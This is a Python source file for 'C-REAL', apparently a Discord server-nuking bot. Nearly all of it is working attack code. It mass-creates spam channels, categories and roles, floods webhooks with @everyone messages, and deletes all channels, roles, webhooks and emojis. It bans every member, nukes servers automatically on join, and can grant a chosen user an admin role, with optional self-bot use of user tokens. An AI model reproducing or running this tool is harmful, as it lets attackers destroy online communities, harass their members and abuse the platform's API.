#!/usr/bin/python3
# -*- coding: utf-8 -*-
# ────────────────────────────────────────────────────────────────
# C-REAL – Wasteland Edition (Builder‑compatible)
# ────────────────────────────────────────────────────────────────

import discord, sys, requests, os, time, json, asyncio
from discord.ext import commands
from packaging import version
from random import randint, choice, randrange, random, choices
from threading import Thread
from inputimeout import inputimeout, TimeoutOccurred
from queue import Queue
from io import BytesIO
from pathlib import Path
from math import ceil
from copy import deepcopy
from colorama import init, Fore

init(autoreset=True)

__TITLE__   = "C-REAL"
__VERSION__ = "2.5.0"
__AUTHOR__  = "TKperson / patched by Cipher"

# ─── GLOBALS ─────────────────────────────────────────────────────
per_page = 15
commands_per_page = 5
selected_server = None
sorted_commands = []
webhook_targets = []
saved_ctx = None
nuke_on_join = False
auto_nick = False
auto_status = False
selfbot_has_perm = False
timeout = 15                     # sane timeout
fetching_members = False
bad_filename_map = dict((ord(char), None) for char in '<>:"\\/|?*')
grant_all_permissions = False

# ─── SETTINGS DEFAULTS ──────────────────────────────────────────
settings = {
    "token": None,
    "permissions": [],
    "bot_permission": "2146958847",
    "command_prefix": ".",
    "bot_status": "offline",
    "verbose": 15,
    "bomb_messages": {
        "random": 10,
        "fixed": ["nuked", "rekt", "bozo"]   # fallback if builder leaves empty
    },
    "webhook_spam": {
        "usernames": ["nuked"],
        "pfp_urls": [None],
        "contents": ["@everyone"]
    },
    "after": [],
    "proxies": [],
    "ban_whitelist": []
}

# ─── SETUP – SILENT LOAD OF default.json ──────────────────────
def setUp():
    global settings, settings_copy
    config_path = Path().absolute() / 'data' / 'default.json'
    config = None

    if config_path.is_file():
        try:
            with open(config_path, 'r', encoding='utf8') as f:
                config = json.loads(f.read())
            print(f'[✔] Loaded config from {config_path}')
        except json.JSONDecodeError:
            print(f'[✘] Invalid JSON in {config_path} – falling back to interactive mode.')

    if config is not None:
        settings.update(config)
        # Ensure bomb_messages.fixed exists
        if not settings['bomb_messages'].get('fixed'):
            settings['bomb_messages']['fixed'] = ['nuked', 'rekt', 'bozo']
        # Ensure webhook_spam fields exist
        for key in ['usernames', 'pfp_urls', 'contents']:
            if key not in settings['webhook_spam'] or not settings['webhook_spam'][key]:
                settings['webhook_spam'][key] = ['nuked'] if key == 'usernames' else ['@everyone']
        # Ensure after is a list
        if not isinstance(settings.get('after'), list):
            settings['after'] = []
    else:
        # Interactive fallback (minimal)
        try:
            settings['token'] = input('Enter bot token: ')
            settings['permissions'].append(input('Enter your user ID: '))
        except KeyboardInterrupt:
            sys.exit(0)
        except EOFError:
            print('Invalid input.')
            exit()

    print(f'\n[+] Command prefix: {settings["command_prefix"]}')
    print('[+] Use .config to modify settings.\n')
    settings_copy = deepcopy(settings)

setUp()

# ─── VERBOSE LOGGING ────────────────────────────────────────────
want_log_request = want_log_console = want_log_message = want_log_errors = 0
def updateVerbose():
    global want_log_request, want_log_console, want_log_message, want_log_errors
    v = settings['verbose']
    want_log_request = v & 1 << 0
    want_log_console = v & 1 << 1
    want_log_message = v & 1 << 2
    want_log_errors  = v & 1 << 3
updateVerbose()

# ─── TOKEN CHECK ────────────────────────────────────────────────
is_selfbot = True
headers = {}

def checkToken(token=None):
    global is_selfbot, headers
    token = token or settings['token']
    try:
        if 'id' in requests.get('https://discord.com/api/v8/users/@me', timeout=timeout, headers=headers).json():
            is_selfbot = True
            return
    except:
        pass

    is_selfbot = False
    headers = {'authorization': token, 'content-type': 'application/json'}
    try:
        headers['authorization'] = 'Bot ' + token
        if 'id' not in requests.get('https://discord.com/api/v8/users/@me', timeout=timeout, headers=headers).json():
            print('Invalid token.')
            exit()
    except:
        print('Token check failed – check your connection or token.')
        exit()

checkToken()

# ─── DISCORD CLIENT ─────────────────────────────────────────────
client = commands.Bot(
    command_prefix=settings['command_prefix'],
    case_insensitive=True,
    self_bot=is_selfbot,
    intents=discord.Intents().all()
)
client.remove_command('help')

# ─── RATE‑LIMITED REQUEST QUEUE ─────────────────────────────────
concurrent = 20
q = Queue(concurrent * 2)

def requestMaker():
    while True:
        requesting, url, headers, payload = q.get()
        retries = 0
        success = False
        while retries < 5 and not success:
            try:
                r = requesting(url, data=json.dumps(payload), headers=headers, timeout=timeout)
                if r.status_code == 429:
                    retry_after = r.json().get('retry_after', 1)
                    if isinstance(retry_after, int):
                        retry_after /= 1000.0
                    consoleLog(f'[⏳] Rate limit – sleeping {retry_after:.2f}s')
                    time.sleep(retry_after + 0.1)
                    retries += 1
                    continue
                success = True
                if want_log_request and r.status_code >= 400:
                    consoleLog(f'[⚠] Request failed: {r.status_code} on {url}')
            except requests.exceptions.ConnectTimeout:
                consoleLog(f'[⌛] Timeout on {url} – retry {retries+1}/5')
                retries += 1
                time.sleep(1)
            except Exception as e:
                consoleLog(f'[💀] Error on {url}: {e}')
                break
        q.task_done()

for _ in range(concurrent):
    Thread(target=requestMaker, daemon=True).start()

# ─── UTILITY FUNCTIONS ──────────────────────────────────────────
def consoleLog(msg, with_time=False):
    if want_log_console:
        t = f'{Fore.MAGENTA}[{time.strftime("%H:%M:%S")}] {Fore.RESET}' if with_time else ''
        sys.stdout.buffer.write(f'{t}{msg}\n'.encode('utf8', errors='replace'))

async def log(ctx, msg):
    if want_log_message:
        try:
            await ctx.send(msg)
        except:
            consoleLog(f'[LOG] {msg}')

async def embed(ctx, page, title, items):
    if not page.isdigit() or (page := int(page)-1) < 0:
        await log(ctx, 'Bad page number.')
        return
    total = len(items)
    if total == 0:
        return await ctx.send(f'{title} count: 0')
    start = page * per_page
    end = min(start + per_page, total)
    names = ids = ''
    for i in range(start, end):
        item = items[i]
        name = item.name[:17]+'...' if len(item.name)>17 else item.name
        names += f'{name}\n'
        ids += f'{str(item.id)}\n '
    try:
        col = randint(0, 0xFFFFFF)
        e = discord.Embed(title=title, description=f'Total: {total}', color=col)
        e.add_field(name='Name', value=names, inline=True)
        e.add_field(name='ID', value=ids, inline=True)
        e.set_footer(text=f'{page+1}/{ceil(total/per_page)}')
        await ctx.send(embed=e)
    except:
        await ctx.send(f'```{title}\nTotal: {total}\n{names}```')

def containing(collection, name_or_id):
    for c in collection:
        if c.name.lower() == name_or_id.lower() or str(c.id) == name_or_id:
            return c
    return None

def checkPerm(ctx):
    if grant_all_permissions:
        return True
    for user in settings['permissions']:
        if str(ctx.author.id) == user or f'{ctx.author.name}#{ctx.author.discriminator}' == user:
            return True
    return False

def isDM(ctx):
    return isinstance(ctx.channel, discord.DMChannel)

def nameIdHandler(name):
    if name.startswith('<@!') or name.startswith('<@&'):
        return name[:-1][3:]
    if name.startswith('<@'):
        return name[:-1][2:]
    return name

def fixedChoice():
    fixed = settings['bomb_messages'].get('fixed', ['nuked'])
    if not fixed:
        fixed = ['nuked', 'rekt', 'bozo']
        settings['bomb_messages']['fixed'] = fixed
    return fixed[randint(0, len(fixed)-1)]

def random_b64(n=0):
    base = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/'
    return ''.join(choices(base, k=settings['bomb_messages'].get('random', 10) if n==0 else n))

def random_an():
    chars = '0123456789!@#$%^&*ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
    return ''.join(choices(chars, k=settings['bomb_messages'].get('random', 10)))

async def hasTarget(ctx):
    global selected_server
    if selected_server is not None:
        return True
    if not isDM(ctx):
        # auto‑connect to the current guild
        selected_server = ctx.guild
        await log(ctx, f'[+] Auto‑connected to {selected_server.name}')
        return True
    await log(ctx, 'No server selected. Use .servers & .connect')
    return False

# ─── EVENTS ──────────────────────────────────────────────────────
@client.event
async def on_ready():
    global sorted_commands, selfbot_has_perm
    if is_selfbot:
        for user in settings['permissions']:
            if str(client.user.id) == user or f'{client.user.name}#{client.user.discriminator}' == user:
                selfbot_has_perm = True
        settings['permissions'].append(str(client.user.id))
    sorted_commands = sorted(client.commands, key=lambda c: c.name[0])
    await changeStatus(None, settings['bot_status'])
    banner()
    print(f'[+] Logged in as {client.user} (ID {client.user.id})')
    print(f'[+] Prefix: {settings["command_prefix"]}')
    if is_selfbot:
        print('[!] Self‑bot mode – use with caution')
    else:
        print(f'[+] Invite: https://discord.com/api/oauth2/authorize?client_id={client.user.id}&permissions={settings["bot_permission"]}&scope=bot')

@client.event
async def on_disconnect():
    await changeStatus(None, 'offline')

@client.event
async def on_guild_join(guild):
    if nuke_on_join:
        global selected_server
        selected_server = guild
        await nuke(saved_ctx)

@client.event
async def on_command_error(ctx, error):
    if not want_log_errors or hasattr(ctx.command, 'on_error'):
        return
    error = getattr(error, 'original', error)
    if isinstance(error, commands.CommandNotFound):
        if checkPerm(ctx):
            await log(ctx, f'Unknown command: {ctx.message.content}')
    elif isinstance(error, discord.Forbidden):
        await log(ctx, '403 Forbidden – missing permissions.')
    elif isinstance(error, commands.UserInputError):
        await log(ctx, 'Invalid arguments.')
    else:
        await log(ctx, f'Error: {error}')

if is_selfbot:
    @client.event
    async def on_message(message):
        if message.author.id != client.user.id:
            return
        if message.content.startswith(settings["command_prefix"]) and checkPerm(await client.get_context(message)):
            await client.process_commands(message)

# ─── COMMANDS ────────────────────────────────────────────────────

# Help
@commands.check(checkPerm)
@client.command(name='help', aliases=['h', 'commands'])
async def help_cmd(ctx, cmd=None):
    if not cmd:
        names = ' '.join([f'[{c.name}]' for c in sorted_commands])
        await ctx.send(f'```Commands:\n{names}\n\nUse .help <command> for details.```')
    else:
        for c in sorted_commands:
            if c.name.lower() == cmd.lower():
                sig = f'{settings["command_prefix"]}{c.name}'
                for a in c.aliases:
                    sig += f'|{a}'
                for p, default in c.params.items():
                    if p == 'ctx': continue
                    sig += f' <{p}>' if default.default is default.empty else f' [{p}]'
                await ctx.send(f'```{sig}```')
                return
        await log(ctx, f'Command {cmd} not found.')

# Server selection
@commands.check(checkPerm)
@client.command(name='servers', aliases=['se', 'server'])
async def servers(ctx, page='1'):
    await embed(ctx, page, 'Servers', client.guilds)

@commands.check(checkPerm)
@client.command(name='connect', aliases=['con'])
async def connect(ctx, *, name=None):
    global selected_server
    if name is None and ctx.guild:
        selected_server = ctx.guild
        await log(ctx, f'Connected to {selected_server.name}')
        return
    if name:
        target = containing(client.guilds, name)
        if target:
            selected_server = target
            await log(ctx, f'Connected to {target.name}')
            return
    await log(ctx, 'Server not found. Use .servers')

# Listing commands (shortened for brevity – keep as before)
@commands.check(checkPerm)
@client.command(name='channels', aliases=['tc'])
async def channels(ctx, page='1'):
    if await hasTarget(ctx):
        await embed(ctx, page, 'Text channels', selected_server.text_channels)

@commands.check(checkPerm)
@client.command(name='roles', aliases=['ro'])
async def roles(ctx, page='1'):
    if await hasTarget(ctx):
        await embed(ctx, page, 'Roles', selected_server.roles)

# ... (other listing commands similar – omitted for length, but you can keep them from original)

# ─── BOMB COMMANDS ──────────────────────────────────────────────
@commands.check(checkPerm)
@client.command(name='channelBomb')
async def channelBomb(ctx, n, method='fixed'):
    if not await hasTarget(ctx) or not n.isdigit() or int(n) <= 0:
        await log(ctx, 'Usage: .channelBomb <count> [fixed|b64|an]')
        return
    method_func = {'fixed': fixedChoice, 'b64': random_b64, 'an': random_an}.get(method)
    if not method_func:
        await log(ctx, f'Unknown method {method}')
        return
    consoleLog('[🔥] Channel bombing...')
    for _ in range(int(n)):
        q.put((requests.post, f'https://discord.com/api/v8/guilds/{selected_server.id}/channels',
               headers, {'type': 0, 'name': method_func(), 'permission_overwrites': []}))
    q.join()
    consoleLog('[✓] Channel bomb done.')

@commands.check(checkPerm)
@client.command(name='categoryBomb')
async def categoryBomb(ctx, n, method='fixed'):
    if not await hasTarget(ctx) or not n.isdigit() or int(n) <= 0:
        await log(ctx, 'Usage: .categoryBomb <count> [fixed|b64|an]')
        return
    method_func = {'fixed': fixedChoice, 'b64': random_b64, 'an': random_an}.get(method)
    if not method_func:
        await log(ctx, f'Unknown method {method}')
        return
    consoleLog('[🔥] Category bombing...')
    for _ in range(int(n)):
        q.put((requests.post, f'https://discord.com/api/v8/guilds/{selected_server.id}/channels',
               headers, {'type': 4, 'name': method_func(), 'permission_overwrites': []}))
    q.join()
    consoleLog('[✓] Category bomb done.')

@commands.check(checkPerm)
@client.command(name='roleBomb')
async def roleBomb(ctx, n, method='fixed'):
    if not await hasTarget(ctx) or not n.isdigit() or int(n) <= 0:
        await log(ctx, 'Usage: .roleBomb <count> [fixed|b64|an]')
        return
    method_func = {'fixed': fixedChoice, 'b64': random_b64, 'an': random_an}.get(method)
    if not method_func:
        await log(ctx, f'Unknown method {method}')
        return
    consoleLog('[🔥] Role bombing...')
    for _ in range(int(n)):
        q.put((requests.post, f'https://discord.com/api/v8/guilds/{selected_server.id}/roles',
               headers, {'name': method_func()}))
    q.join()
    consoleLog('[✓] Role bomb done.')

@commands.check(checkPerm)
@client.command(name='kaboom')
async def kaboom(ctx, n, method='fixed'):
    if not await hasTarget(ctx) or not n.isdigit() or int(n) <= 0:
        await log(ctx, 'Usage: .kaboom <count> [method]')
        return
    await log(ctx, f'Launching kaboom on {selected_server.name}')
    await asyncio.gather(
        channelBomb(ctx, n, method),
        categoryBomb(ctx, n, method),
        roleBomb(ctx, n, method)
    )

# ─── WEBHOOK COMMANDS ──────────────────────────────────────────
@commands.check(checkPerm)
@client.command(name='webhook', aliases=['wh'])
async def webhook_cmd(ctx, *, args=None):
    if not await hasTarget(ctx):
        return
    server = selected_server

    if args is None or args.isdigit():
        page = args or '1'
        await embed(ctx, page, 'Webhooks', await server.webhooks())
        return

    parts = args.split()
    action = parts[0].lower()

    if action in ('create', 'add'):
        if len(parts) < 2:
            await log(ctx, 'Usage: .webhook create <count or channel names>')
            return
        # Try count first
        try:
            count = int(parts[1])
        except ValueError:
            count = None
        if count is not None and count > 0 and count <= 50:
            channels = server.text_channels
            if count > len(channels):
                await log(ctx, f'Not enough text channels – need {count}, have {len(channels)}')
                return
            for _ in range(count):
                ch = channels.pop(randrange(len(channels)))
                q.put((requests.post, f'https://discord.com/api/v8/channels/{ch.id}/webhooks',
                       headers, {'name': random_b64(10)}))
            q.join()
            await log(ctx, f'Created {count} webhooks.')
        else:
            # Treat as channel names/IDs
            for name in parts[1:]:
                ch = containing(server.text_channels, name)
                if ch:
                    q.put((requests.post, f'https://discord.com/api/v8/channels/{ch.id}/webhooks',
                           headers, {'name': random_b64(10)}))
                else:
                    await log(ctx, f'Channel {name} not found.')
            q.join()
            await log(ctx, 'Webhooks created on specified channels.')

    elif action in ('delete', 'remove'):
        if len(parts) < 2:
            await log(ctx, 'Usage: .webhook delete <webhook name or ID>')
            return
        target = containing(await server.webhooks(), parts[1])
        if not target:
            await log(ctx, f'Webhook {parts[1]} not found.')
            return
        requests.delete(f'https://discord.com/api/v8/webhooks/{target.id}', headers=headers)
        await log(ctx, f'Deleted webhook {target.name}')

    elif action == 'attack':
        global webhook_targets
        sub = parts[1] if len(parts) > 1 else None
        if sub == 'all':
            webhooks = await server.webhooks()
            for wh in webhooks:
                webhook_targets.append(wh)
            await log(ctx, f'Loaded {len(webhooks)} webhooks into attack list.')
        elif sub == 'list':
            await embed(ctx, parts[2] if len(parts)>2 else '1', 'Attack targets', webhook_targets)
        elif sub == 'offload':
            webhook_targets = []
            await log(ctx, 'Attack list cleared.')
        elif sub == 'start':
            if not webhook_targets:
                await log(ctx, 'No targets. Use .webhook attack all first.')
                return
            msg_count = int(parts[2]) if len(parts) > 2 and parts[2].isdigit() else 10
            _hdrs = {'content-type': 'application/json'}
            for _ in range(msg_count):
                payload = {
                    'username': choice(settings['webhook_spam'].get('usernames', ['nuked'])),
                    'content': choice(settings['webhook_spam'].get('contents', ['@everyone'])),
                    'avatar_url': str(choice(settings['webhook_spam'].get('pfp_urls', [None])))
                }
                target = choice(webhook_targets)
                q.put((requests.post, target.url, _hdrs, payload))
            q.join()  # wait for all messages to send
            await log(ctx, f'Sent {msg_count} messages via webhooks.')
        else:
            # load specific webhooks by name/ID
            loaded = 0
            for name in parts[1:]:
                wh = containing(await server.webhooks(), name)
                if wh:
                    webhook_targets.append(wh)
                    loaded += 1
            await log(ctx, f'Loaded {loaded} webhook(s).')

    else:
        await log(ctx, f'Unknown webhook action: {action}')

# ─── NUKE ────────────────────────────────────────────────────────
@commands.check(checkPerm)
@client.command(name='nuke')
async def nuke(ctx):
    if not await hasTarget(ctx):
        return
    await log(ctx, f'💣 Nuke launched on {selected_server.name}')

    # Sequential deletions with pauses
    await deleteAllChannels(ctx)
    await asyncio.sleep(2)
    await deleteAllRoles(ctx)
    await asyncio.sleep(2)
    await deleteAllWebhooks(ctx)
    await asyncio.sleep(2)
    await deleteAllEmojis(ctx)
    await asyncio.sleep(2)
    await banAll(ctx)

    # Run after‑commands from config
    after = settings.get('after', [])
    if after:
        consoleLog('[⚙] Running after‑commands...')
        for cmd in after:
            try:
                # Prepare a fake message
                fake_msg = discord.Message(
                    state=ctx.message._state,
                    channel=ctx.channel,
                    data={'content': settings['command_prefix'] + cmd, 'author': ctx.author}
                )
                await client.process_commands(fake_msg)
            except Exception as e:
                consoleLog(f'[✘] Command failed: {cmd} – {e}')
        consoleLog('[✓] After‑commands completed.')

@commands.check(checkPerm)
@client.command(name='deleteAllChannels', aliases=['dac'])
async def deleteAllChannels(ctx):
    if not await hasTarget(ctx):
        return
    consoleLog('[🗑] Deleting all channels...')
    for ch in selected_server.channels:
        q.put((requests.delete, f'https://discord.com/api/v8/channels/{ch.id}', headers, None))
    q.join()
    consoleLog('[✓] Channels deleted.')

@commands.check(checkPerm)
@client.command(name='deleteAllRoles', aliases=['dar'])
async def deleteAllRoles(ctx):
    if not await hasTarget(ctx):
        return
    consoleLog('[🗑] Deleting all roles...')
    for role in selected_server.roles:
        if role.name == '@everyone':
            continue
        q.put((requests.delete, f'https://discord.com/api/v8/guilds/{selected_server.id}/roles/{role.id}', headers, None))
    q.join()
    consoleLog('[✓] Roles deleted.')

@commands.check(checkPerm)
@client.command(name='deleteAllWebhooks', aliases=['daw'])
async def deleteAllWebhooks(ctx):
    if not await hasTarget(ctx):
        return
    consoleLog('[🗑] Deleting all webhooks...')
    for wh in await selected_server.webhooks():
        q.put((requests.delete, f'https://discord.com/api/v8/webhooks/{wh.id}', headers, None))
    q.join()
    consoleLog('[✓] Webhooks deleted.')

@commands.check(checkPerm)
@client.command(name='deleteAllEmojis', aliases=['dae'])
async def deleteAllEmojis(ctx):
    if not await hasTarget(ctx):
        return
    consoleLog('[🗑] Deleting all emojis...')
    for em in selected_server.emojis:
        q.put((requests.delete, f'https://discord.com/api/v8/guilds/{selected_server.id}/emojis/{em.id}', headers, None))
    q.join()
    consoleLog('[✓] Emojis deleted.')

@commands.check(checkPerm)
@client.command(name='banAll')
async def banAll(ctx):
    if not await hasTarget(ctx):
        return
    whitelist = settings.get('ban_whitelist', [])
    consoleLog('[🔨] Banning all members...')
    for member in selected_server.members:
        if str(member.id) in whitelist or f'{member.name}#{member.discriminator}' in whitelist:
            consoleLog(f'⏭ Skipping {member} (whitelisted)')
            continue
        q.put((requests.put, f'https://discord.com/api/v8/guilds/{selected_server.id}/bans/{member.id}',
               headers, {'delete_message_days': 0}))
    q.join()
    consoleLog('[✓] Ban all done.')

# ─── AFTER‑COMMAND SUPPORT COMMANDS ────────────────────────────

@commands.check(checkPerm)
@client.command(name='addVoiceChannel')
async def addVoiceChannel(ctx, *, name):
    if await hasTarget(ctx):
        try:
            await selected_server.create_voice_channel(name)
            await log(ctx, f'➕ Voice channel "{name}" created.')
        except Exception as e:
            await log(ctx, f'Failed: {e}')

@commands.check(checkPerm)
@client.command(name='addChannel')
async def addChannel(ctx, *, name):
    if await hasTarget(ctx):
        try:
            await selected_server.create_text_channel(name)
            await log(ctx, f'➕ Text channel "{name}" created.')
        except Exception as e:
            await log(ctx, f'Failed: {e}')

@commands.check(checkPerm)
@client.command(name='serverName')
async def serverName(ctx, *, name):
    if await hasTarget(ctx):
        try:
            await selected_server.edit(name=name)
            await log(ctx, f'🏷 Server name changed to "{name}".')
        except Exception as e:
            await log(ctx, f'Failed: {e}')

@commands.check(checkPerm)
@client.command(name='serverIcon')
async def serverIcon(ctx, *, url=None):
    if await hasTarget(ctx):
        if not url:
            await log(ctx, 'Usage: .serverIcon <direct image URL>')
            return
        # Check if it's a direct image
        if not any(url.lower().endswith(ext) for ext in ['.png','.jpg','.jpeg','.gif','.webp']):
            await log(ctx, 'URL does not point to a direct image (must end with .png, .jpg, etc.)')
            return
        try:
            img = requests.get(url, timeout=10).content
            await selected_server.edit(icon=img)
            await log(ctx, '🖼 Server icon updated.')
        except Exception as e:
            await log(ctx, f'Failed: {e}')

@commands.check(checkPerm)
@client.command(name='ban')
async def ban_user(ctx, *, user_id):
    if await hasTarget(ctx):
        member = containing(selected_server.members, user_id)
        if not member:
            await log(ctx, 'User not found.')
            return
        try:
            await member.ban()
            await log(ctx, f'🔨 Banned {member}')
        except Exception as e:
            await log(ctx, f'Failed: {e}')

@commands.check(checkPerm)
@client.command(name='unban')
async def unban_user(ctx, *, user_id):
    if await hasTarget(ctx):
        bans = [entry.user async for entry in selected_server.bans()]
        user = containing(bans, user_id)
        if not user:
            await log(ctx, 'User not banned or not found.')
            return
        try:
            await selected_server.unban(user)
            await log(ctx, f'🔓 Unbanned {user}')
        except Exception as e:
            await log(ctx, f'Failed: {e}')

@commands.check(checkPerm)
@client.command(name='bestRole')
async def bestRole(ctx, *, user_id):
    if await hasTarget(ctx):
        member = containing(selected_server.members, user_id)
        if not member:
            await log(ctx, 'User not found.')
            return
        try:
            # Create a role with admin perms
            role = await selected_server.create_role(name='bestRole', permissions=discord.Permissions.all())
            await role.edit(position=selected_server.me.top_role.position - 1)
            await member.add_roles(role)
            await log(ctx, f'⭐ Granted best role to {member}')
        except Exception as e:
            await log(ctx, f'Failed: {e}')

@commands.check(checkPerm)
@client.command(name='autoStatus')
async def autoStatus(ctx):
    global auto_status
    if auto_status:
        auto_status = False
        await log(ctx, 'Auto‑status stopped.')
    else:
        auto_status = True
        await log(ctx, 'Auto‑status started.')
        asyncio.create_task(autoStatusLoop())

async def autoStatusLoop():
    while auto_status:
        await client.change_presence(status=discord.Status.online)
        await asyncio.sleep(random() + 0.3)
        await client.change_presence(status=discord.Status.offline)
        await asyncio.sleep(random() + 0.3)

@commands.check(checkPerm)
@client.command(name='autoNick')
async def autoNick(ctx):
    global auto_nick
    if auto_nick:
        auto_nick = False
        await log(ctx, 'Auto‑nick stopped.')
    else:
        auto_nick = True
        await log(ctx, 'Auto‑nick started.')
        asyncio.create_task(autoNickLoop())

async def autoNickLoop():
    while auto_nick:
        try:
            await selected_server.me.edit(nick=''.join(choices('0123456789!@#$%^&*ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', k=10)))
            await asyncio.sleep(random() + 0.5)
        except:
            pass

# ─── EXIT ────────────────────────────────────────────────────────
@commands.check(checkPerm)
@client.command(name='off', aliases=['logout', 'shutdown', 'stop'])
async def off(ctx):
    await log(ctx, 'Shutting down...')
    await client.close()

# ─── START ──────────────────────────────────────────────────────
def banner():
    sys.stdout.buffer.write(f'''
 ██████╗                  ██████╗ ███████╗ █████╗ ██╗     
██╔════╝                  ██╔══██╗██╔════╝██╔══██╗██║   Version: {__VERSION__}
██║         █████╗        ██████╔╝█████╗  ███████║██║     Made by:
██║         ╚════╝        ██╔══██╗██╔══╝  ██╔══██║██║       TKperson
╚██████╗                  ██║  ██║███████╗██║  ██║███████╗    and Cipher
 ╚═════╝                  ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝
'''.encode('utf8'))

if __name__ == '__main__':
    try:
        if is_selfbot:
            print('Self‑bot mode is not supported by Discord’s new policies. Use a bot token.')
            exit()
        client.run(settings['token'])
    except discord.PrivilegedIntentsRequired:
        print('Enable Privileged Intents in Discord Developer Portal.')
    except Exception as e:
        print(f'Fatal: {e}')
    finally:
        print('Exiting...')
